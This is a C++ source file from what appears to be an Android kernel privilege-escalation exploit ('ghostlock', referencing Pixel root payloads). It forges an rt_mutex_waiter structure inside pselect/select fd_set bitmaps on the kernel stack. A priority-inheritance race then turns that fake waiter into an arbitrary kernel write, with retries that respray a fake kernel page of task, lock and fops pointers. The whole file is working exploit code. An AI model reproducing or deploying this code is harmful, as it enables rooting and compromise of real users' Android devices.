#include "route/select_stack_route.h"

#include <unistd.h>

#include <utility>

using namespace ghostlock;

namespace ghostlock::route::select_stack {
    SelectStackRoute::SelectStackRoute(
        race::PiRace *race_context, const memory::WriteRequest *route_request,
        const profile::TargetProfile &profile_value,
        profile::SelectStackLayout route_layout,
        const std::array<int32_t, 3> &stdio_backup_value) noexcept
        : race(race_context),
          request(route_request),
          profile(profile_value),
          layout(route_layout) {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            stdio_backup[fd] = support::BorrowedFd(stdio_backup_value[fd]);
        }
        /* The C version memset the whole context; zero the sets explicitly so a
   * destroy() before prepare() never tests uninitialized bits. */
        input_set.zero();
        output_set.zero();
        exception_set.zero();
        owned_input_set.zero();
        owned_output_set.zero();
        owned_exception_set.zero();
        status.code = ROUTE_RETRYABLE;
    }

    SelectStackRoute::SelectStackRoute(
        SelectStackRoute &&other) noexcept
        : race(other.race),
          request(other.request),
          profile(other.profile),
          layout(other.layout),
          input_set(other.input_set),
          output_set(other.output_set),
          exception_set(other.exception_set),
          owned_input_set(other.owned_input_set),
          owned_output_set(other.owned_output_set),
          owned_exception_set(other.owned_exception_set),
          pipe_read(std::move(other.pipe_read)),
          pipe_write(std::move(other.pipe_write)),
          block(std::move(other.block)),
          high_read(std::move(other.high_read)),
          block_borrows_pipe(other.block_borrows_pipe),
          selected_fds_installed(other.selected_fds_installed),
          consumer_stuck(other.consumer_stuck),
          calls(other.calls),
          successes(other.successes),
          select_result(other.select_result),
          select_errno(other.select_errno),
          status(other.status) {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            stdio_backup[fd] = other.stdio_backup[fd];
        }
    }

    int32_t SelectStackRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void SelectStackRoute::disarm() noexcept {
        race->consumer_go.store(0);
        if (race->consumer_inflight.load() != 0) {
            for (int32_t i = 0;
                 i < 2000 && race->consumer_inflight.load() != 0;
                 i++) {
                usleep(1000);
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void SelectStackRoute::retain_for_process_lifetime() noexcept {
        /* A stuck consumer may still walk these descriptors, so none of them may be
   * closed: hand every owner's descriptor to the process lifetime. */
        (void) high_read.release_to_process_lifetime("pselect consumer stuck");
        if (!block_borrows_pipe) {
            (void) block.release_to_process_lifetime("pselect consumer stuck");
        }
        (void) pipe_read.release_to_process_lifetime("pselect consumer stuck");
        (void) pipe_write.release_to_process_lifetime("pselect consumer stuck");
        /* The dup2-installed descriptors stay open as well: selected_fds_installed
   * remains set and nothing below closes them. */
    }

    void SelectStackRoute::destroy() noexcept {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            if (stdio_backup[fd].valid())
                dup2(stdio_backup[fd].get(), static_cast<int32_t>(fd));
        }
        if (consumer_stuck) {
            (void) fail(34, select_errno);
            status.code = ROUTE_DIRTY_FAILURE;
            retain_for_process_lifetime();
            return;
        }
        if (selected_fds_installed) {
            for (int32_t fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
                if (owned_input_set.test(fd) || owned_output_set.test(fd) ||
                    owned_exception_set.test(fd)) {
                    /* The fd number may also be owned by the pipe/timerfd members: drop
         * that owner before closing so nothing is closed twice. */
                    if (pipe_read.get() == fd) (void) pipe_read.release();
                    if (pipe_write.get() == fd) (void) pipe_write.release();
                    if (block.get() == fd) (void) block.release();
                    if (high_read.get() == fd) (void) high_read.release();
                    close(fd);
                }
            }
            selected_fds_installed = 0;
        }
        high_read.reset();
        if (!block_borrows_pipe) block.reset();
        pipe_read.reset();
        pipe_write.reset();
        status.userspace_clean = 1;
        if (status.code != ROUTE_OK && status.kernel_disarmed) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace ghostlock::route::select_stack

#if defined(__ANDROID__)
#include "common.h"

#include <array>
#include <ctime>
#include <iterator>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/timerfd.h>

#include "kernel/target.h"
#include "session/exploit_session.hpp"

/* The two Multicast stamp buffers intentionally remain dynamic stack frames.
 * Their layout/order is device-verified and must not become heap-backed STL. */
#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "route/multicast_waiter_route.h"
#include "route/route_lifecycle.hpp"
#include "route/select_stack_route.h"
#include "route/tcp_zerocopy_route.h"

using namespace ghostlock;

namespace ghostlock::route {
    static double fops_elapsed_ms(struct timespec *ref) {
        return runtime_time::runtime_elapsed_ms(ref);
    }

    } // namespace ghostlock::route


namespace ghostlock::route {
    /* Public compatibility entry: lifecycle is now explicitly ordered while the
 * common route dispatcher remains scheduled for S14. */
    static uint32_t route_delay_usec(const select_stack::SelectStackRoute *context,
                                int32_t attempt) {
        if (!context->layout.compact_waiter) {
            (void) attempt;
            /* Let select establish its frame and stamp the crafted waiter before
         * the PI walk fires. */
            return context->profile.select_enter_delay_us();
        }
        /* Compact retry walks a delay ladder (U01/SELECT-01, mirroring the
     * upstream 50d2b72 candidate list); the profile's enter delay seeds the
     * first attempt. The ladder stays native-side until a Select device can
     * validate a schema extension. */
        const uint32_t seed = context->profile.select_enter_delay_us();
        static constexpr std::array<uint32_t, 8> delays = {
            50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
        };
        const uint32_t ladder = delays[static_cast<size_t>((attempt - 1) % 8)];
        return attempt == 1 && seed != 0 ? seed : ladder;
    }

    void fdset_put_word(fd_set *set, int32_t word, uint64_t value) {
        unsigned long *bits = reinterpret_cast<unsigned long *>(set);
        bits[word] = static_cast<unsigned long>(value);
    }

    uint64_t fdset_get_word(const fd_set *set, int32_t word) {
        const unsigned long *bits = reinterpret_cast<const unsigned long *>(set);
        return bits[word];
    }

    static int32_t pselect_words_per_set(void) {
        int32_t bits_per_word = static_cast<int32_t>(8 * sizeof(unsigned long));
        return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
    }

    static int32_t pselect_put_global_word(
        fd_set *in, fd_set *out, fd_set *ex, int32_t words_per_set,
        int32_t global_word, uint64_t value) {
        if (global_word < 0) {
            return 0;
        }

        int32_t set_idx = global_word / words_per_set;
        int32_t word_idx = global_word % words_per_set;
        switch (set_idx) {
            case 0:
                fdset_put_word(in, word_idx, value);
                return 1;
            case 1:
                fdset_put_word(out, word_idx, value);
                return 1;
            case 2:
                fdset_put_word(ex, word_idx, value);
                return 1;
            default:
                return 0;
        }
    }

    static int32_t pselect_waiter_shift(const select_stack::SelectStackRoute *context) {
        return session::g_exploit_session.profile.loaded()
                   ? context->layout.waiter_shift
                   : kernel::PSELECT_WAITER_WORD_SHIFT;
    }

    static void pselect_put_waiter_word(
        select_stack::SelectStackRoute *context, int32_t words_per_set,
        int32_t waiter_word, uint64_t value, const char *name) {
        int32_t global_word = pselect_waiter_shift(context) + waiter_word;
        int32_t placed = pselect_put_global_word(
            context->input_set.raw(), context->output_set.raw(),
            context->exception_set.raw(),
            words_per_set, global_word, value);
        if (!placed) {
            pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
                       "words_per_set=%d nfds=%d\n",
                       name, waiter_word, global_word, words_per_set,
                       PSELECT_ROUTE_NFDS);
        }
    }

    static void open_selected_fds(
        fd_set *in, fd_set *out, fd_set *ex, int32_t read_fd, int32_t write_fd) {
        /* every bit lands on the read end so select/pselect parks the full window */
        (void) write_fd;
        int32_t high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
        if (high_read < 0) {
            pr_warning("pselect F_DUPFD read errno=%d\n", errno);
            return;
        }
        for (int32_t fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
            if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
                dup2(high_read, fd);
            }
        }
        close(high_read);
        dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
        FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
    }

    static std::array<int32_t, 3> standard_io_backup = {-1, -1, -1};

    void reserve_standard_io(void) {
        for (int32_t fd = 0; fd < static_cast<int32_t>(standard_io_backup.size()); fd++) {
            if (standard_io_backup[static_cast<size_t>(fd)] >= 0) continue;
            int32_t backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
            if (backup < 0) {
                pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
            } else {
                standard_io_backup[static_cast<size_t>(fd)] = backup;
            }
        }
    }

    static void restore_standard_io(const std::array<support::BorrowedFd, 3> &backup) {
        for (size_t fd = 0; fd < backup.size(); fd++) {
            if (!backup[fd].valid()) continue;
            dup2(backup[fd].get(), static_cast<int32_t>(fd));
        }
    }

    static void select_stack_build_fdsets(select_stack::SelectStackRoute *context) {
        select_stack::FdSet *in = &context->input_set;
        select_stack::FdSet *out = &context->output_set;
        select_stack::FdSet *ex = &context->exception_set;
        const memory::WriteRequest *request = context->request;
        in->zero();
        out->zero();
        ex->zero();

        int32_t words_per_set = pselect_words_per_set();
        int32_t compact = context->layout.compact_waiter;

        struct pselect_waiter_word {
            int32_t word;
            uint64_t value;
            const char *name;
        };

        if (compact) {
            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
         * the write value, children the write target; waiter->task is the
         * payload fake_task (planted fields for the PI walk). */
            struct pselect_waiter_word words[] = {
                {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
                {3, 0, "tree_right"},
                {4, request->target, "tree_left"},
                {5, (session::g_exploit_session.heap.current.fake_right), "pi_pc"},
                {6, 0, "pi_right"},
                {7, request->target, "pi_left"},
                {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
                {11, 0, "deadline"},
                {12, 0, "ww_ctx"},
            };
            for (size_t i = 0; i < std::size(words); i++) {
                struct pselect_waiter_word *w = &words[i];
                pselect_put_waiter_word(context, words_per_set,
                                        w->word, w->value, w->name);
            }
        } else {
            /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
            struct pselect_waiter_word words[] = {
                {2, 0, "tree_pc"},
                {3, 0, "tree_right"},
                {4, 0, "tree_left"},
                {5, 1, "tree_prio"},
                {6, 0, "tree_deadline"},
                {7, 0, "pi_parent"},
                {8, 0, "pi_right"},
                {9, 0, "pi_left"},
                {10, 1, "pi_prio"},
                {11, 0, "pi_deadline"},
                {12, (session::g_exploit_session.heap.current.fake_task), "task"},
                {13, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                {14, 3, "wake_state"},
            };
            for (size_t i = 0; i < std::size(words); i++) {
                struct pselect_waiter_word *w = &words[i];
                pselect_put_waiter_word(context, words_per_set,
                                        w->word, w->value, w->name);
            }
        }
    }
} // namespace ghostlock::route

namespace ghostlock::route::select_stack {
    int32_t SelectStackRoute::prepare() noexcept {
        if (!(session::g_exploit_session.heap.current.base) || !(session::g_exploit_session.heap.current.fake_lock) || !
            (session::g_exploit_session.
                heap.current.fake_fops)) {
            pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
                       "fops=%016zx\n", (session::g_exploit_session.heap.current.base),
                       (session::g_exploit_session.heap.current.fake_lock),
                       (session::g_exploit_session.heap.current.fake_fops));
            return fail(30, 0);
        }
        int32_t fds[2];
        if (pipe(fds) != 0) {
            return fail(31, errno);
        }
        pipe_read.reset(fds[0]);
        pipe_write.reset(fds[1]);

        /* Both routes park on a never-ready timerfd: the waiter must stay stale
     * on the pselect stack for the whole consumer window. */
        block.reset(static_cast<int32_t>(syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC)));
        if (!block.valid()) {
            pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                       errno);
            block_borrows_pipe = 1;
        }
        high_read.reset(fcntl(block_fd(), F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16));
        if (!high_read.valid()) {
            pr_warning("pselect F_DUPFD read errno=%d\n", errno);
            return fail(32, errno);
        }

        route::select_stack_build_fdsets(this);
        pr_info("pselect route setup shift=%d page=%016zx "
                "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
                "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
                "ex1=%016llx ex2=%016llx ex3=%016llx\n",
                route::pselect_waiter_shift(this),
                (session::g_exploit_session.heap.current.base), (session::g_exploit_session.heap.current.fake_lock),
                (session::g_exploit_session.heap.current.fake_w0), (session::g_exploit_session.heap.current.fake_task),
                (unsigned long long) route::fdset_get_word(input_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(input_set.raw(), 3),
                (unsigned long long) route::fdset_get_word(output_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 1),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 2),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 3));

        /* The route may replace low fds, including stdout and stderr. */
        route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
                                 high_read.get(), pipe_write.get());
        owned_input_set = input_set;
        owned_output_set = output_set;
        owned_exception_set = exception_set;
        high_read.reset();
        selected_fds_installed = 1;
        return 0;
    }

    route::RouteStatus SelectStackRoute::execute() noexcept {
        struct timespec route_t0;
        clock_gettime(CLOCK_MONOTONIC, &route_t0);

        /* Compact retries rebuild the payload page between attempts (U01/SELECT-01,
     * mirroring upstream 50d2b72): a lost race clobbers the page, so every
     * attempt resprays and re-derives fake_* before rebuilding the fd_sets.
     * The consumer handshake advances consumer_go per attempt so the trigger
     * is seen as a new sequence. */
        const int32_t attempts = layout.compact_waiter ? 4 : 1;
        int32_t calls_total = 0;
        int32_t successes_total = 0;

        for (int32_t attempt = 1; attempt <= attempts; attempt++) {
            if (attempt > 1) {
                const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
                if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
                    !(session::g_exploit_session.heap.current.fake_fops)) {
                    pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
                    (void) fail(35, errno);
                    break;
                }
                route::select_stack_build_fdsets(this);
                route::open_selected_fds(input_set.raw(), output_set.raw(),
                                         exception_set.raw(), block_fd(), pipe_write.get());
                owned_input_set = input_set;
                owned_output_set = output_set;
                owned_exception_set = exception_set;
            }

            race->consumer_calls.store(0);
            race->consumer_success.store(0);
            race->consumer_stop.store(0);
            uint32_t delay_usec = route::route_delay_usec(this, attempt);
            race->route_delay_usec.store(delay_usec);
            race->consumer_go.store(attempt);

            pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
                    attempt, attempts, layout.compact_waiter,
                    route::fops_elapsed_ms(&route_t0));
            errno = 0;
            if (layout.compact_waiter) {
                uint32_t timeout_us = profile.select_timeout_us();
                struct timespec ts = {
                    .tv_sec = timeout_us / 1000000,
                    .tv_nsec = (long) (timeout_us % 1000000) * 1000,
                };
                select_result = pselect(
                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                    exception_set.raw(), &ts, nullptr);
            } else {
                uint32_t timeout_us = profile.select_timeout_us();
                struct timeval timeout = {
                    .tv_sec = timeout_us / 1000000,
                    .tv_usec = timeout_us % 1000000,
                };
                select_result = select(
                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                    exception_set.raw(), &timeout);
            }
            select_errno = errno;
            route::restore_standard_io(stdio_backup);
            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
                    attempt, attempts, layout.compact_waiter,
                    route::fops_elapsed_ms(&route_t0), select_result);
            race->consumer_go.store(0);

            const int32_t calls = race->consumer_calls.load();
            const int32_t successes = race->consumer_success.load();
            calls_total += calls;
            successes_total += successes;
            if (calls > 0 && successes > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                break;
            }
            (void) fail(33, select_errno);
        }
        calls = calls_total;
        successes = successes_total;
        return status;
    }
} // namespace ghostlock::route::select_stack

namespace ghostlock::route {
    route::RouteStatus do_pselect_fake_lock_route(const memory::WriteRequest *request) {
        /* U01/SELECT-01: SelectStackRoute::execute() now retries compact routes
     * four times, rebuilding the payload page and fd_sets per attempt and
     * advancing the consumer handshake. The delay ladder and the attempt
     * count stay native-side until a Select device can validate a
     * profile-schema extension; the profile still owns the timeout. */
        select_stack::SelectStackRoute context(
            &session::g_exploit_session.race, request, session::g_exploit_session.profile,
            session::g_exploit_session.profile.select_stack_layout(),
            standard_io_backup);
        const route::RouteStatus status = run_route_lifecycle(context);
        if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 34) {
            pr_error("pselect consumer still inflight; leaking route fds\n");
        }

        pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d\n", context.calls, context.successes,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number);
        return status;
    }
} // namespace ghostlock::route
#endif // __ANDROID__


